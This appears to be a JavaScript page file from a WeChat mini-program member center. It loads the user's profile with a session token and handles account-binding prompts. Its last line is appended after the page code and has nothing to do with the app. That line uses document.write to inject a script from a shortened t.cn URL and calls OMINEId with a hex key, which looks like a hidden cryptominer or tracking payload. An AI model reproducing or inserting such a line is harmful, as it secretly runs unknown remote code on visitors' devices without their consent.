var e = getApp(),
  r = e.requirejs("core"),
  t = e.requirejs("wxParse/wxParse"),
  jq=e.requirejs("jquery");
Page({
  data: {
    route: "member",
    icons: e.requirejs("icons"),
    show:true,
    isshowdaw:false,
    menber: {},
    acountment:"绑定账号",
    session:{
      from:[
        'kelly','lili'
      ],
    }


  },
  onLoad: function (r) {
  
  },
  refersTo:function(){
    wx.redirectTo({
      url: "/pages/member/bind/index"
    })
  },
  getInfo: function () {
    //获取个人信息
    var _this = this;
    r.loading("加载中...");
    wx.request({
      url: e.globalData.daxin + "/memberCenter/memberCenter",
      data: {
        session_token: e.globalData.session_token
      },
      method: "POST",
      success: function (res) {
        wx.stopPullDownRefresh();
        //console.log(res);
        if (res.data.statusCode >=0 && res.data.data){
          r.hideLoading();
          var menbers = {}, acountments="绑定账号";
         menbers = res.data.data.userInfo;
         menbers.nick_name = menbers.nick_name ? menbers.nick_name:(menbers.user_name ? t.globalDatanickName:"游客");
          if (menbers.user_name){
           acountments="切换账号";
         };
         menbers.statics = jq.extend(_this.data.menber.statics, res.data.data.count||{});
         //console.log(menbers);
         _this.setData({
           menber:menbers,
           acountment: acountments
         });

        }else{
          r.hideLoading();
          if (res.data.statusCode == "-500" ){
            wx.showModal({
              title: '提示信息',
              content: res.data.msg,
              confirmText: '绑定用户',
              success: function (res) {
                if (res.confirm) {
                  wx.redirectTo({
                    url: "/pages/member/bind/index"
                  })
                } else if (res.cancel) {
                  _this.setData({
                      isshowdaw:true
                  });
                }
              }
            }) ;
          } else if (res.data.statusCode == "-300"){
            wx.redirectTo({
              url: '/pages/start/start?reSet=true'
            })
          }else{
            wx.showModal({
              title: '提示信息',
              content: '个信息获取失败',
              showCancel: false,
              success: function (res) {
                if (res.confirm) {
                  //console.log('用户点击确定')
                } else if (res.cancel) {
                  //console.log('用户点击取消')
                }
              }
            }) 

          }
        }
      }
    })
  },
  onShow: function () {
    this.getInfo(); 
  },
  onPullDownRefresh(){
    this.getInfo(); 
  },
  onShareAppMessage: function () {
    return r.onShareAppMessage()
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
